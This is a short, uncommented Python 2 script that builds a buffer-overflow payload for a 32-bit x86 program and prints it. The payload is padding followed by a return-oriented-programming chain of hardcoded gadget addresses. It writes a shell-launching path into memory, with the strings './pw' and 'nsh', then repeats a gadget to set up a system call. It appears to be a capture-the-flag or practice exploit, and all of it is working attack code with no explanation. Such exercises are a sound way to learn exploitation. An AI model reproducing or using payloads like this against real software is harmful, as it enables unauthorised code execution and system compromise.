from struct import pack
p = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
for i in range(21):
    p += pack("<I", 0x00000000)
    
    
p += "\x62\x00\x00\x00"

for i in range(3):
     p += pack("<I", 0x00000000)
        
p += "\x00\x00\x00\x00"


p += pack("<I", 0x080524b8)
p += pack("<I", 0x080c6001)
p += pack("<I", 0x080524b8)
p += "./pw"
p += pack("<I", 0x42424242)
p += pack("<I", 0x42424242)
p += pack("<I", 0x42424242)
p += pack("<I", 0x08078ce1)
p += pack("<I", 0x080524b8)
p += pack("<I", 0x0808457a)
p += "nsh\x00"
p += pack("<I", 0x42424242)
p += pack("<I", 0x42424242)
p += pack("<I", 0x42424242)
p += pack("<I", 0x08078ce1)
p += pack("<I", 0x080524b8)
p += pack("<I", 0x080c6009)
p += pack("<I", 0x0809619f)
p += pack("<I", 0x08078ce1)

p += pack("<I", 0x080524b8)
p += pack("<I", 0x080c600d)
p += pack("<I", 0x0808457a)
p += pack("<I", 0x080c6001)
p += pack("<I", 0x42424242)
p += pack("<I", 0x42424242)
p += pack("<I", 0x42424242)
p += pack("<I", 0x08078ce1)
p += pack("<I", 0x0809619f)
p += pack("<I", 0x080524b8)
p += pack("<I", 0x08078ce1)


p += pack("<I", 0x080524e1)
p += pack("<I", 0x080c6011)
p += pack("<I", 0x080c600d)
p += pack("<I", 0x0809619f)
p += pack("<I", 0x080c6001)
p += pack("<I", 0x0809619f)
p += pack("<I", 0x0806a25f)
p += pack("<I", 0x0806a25f)
p += pack("<I", 0x0806a25f)
p += pack("<I", 0x0806a25f)
p += pack("<I", 0x0806a25f)
p += pack("<I", 0x0806a25f)
p += pack("<I", 0x0806a25f)
p += pack("<I", 0x0806a25f)
p += pack("<I", 0x0806a25f)
p += pack("<I", 0x0806a25f)
p += pack("<I", 0x0806a25f)
p += pack("<I", 0x08051570)

print p







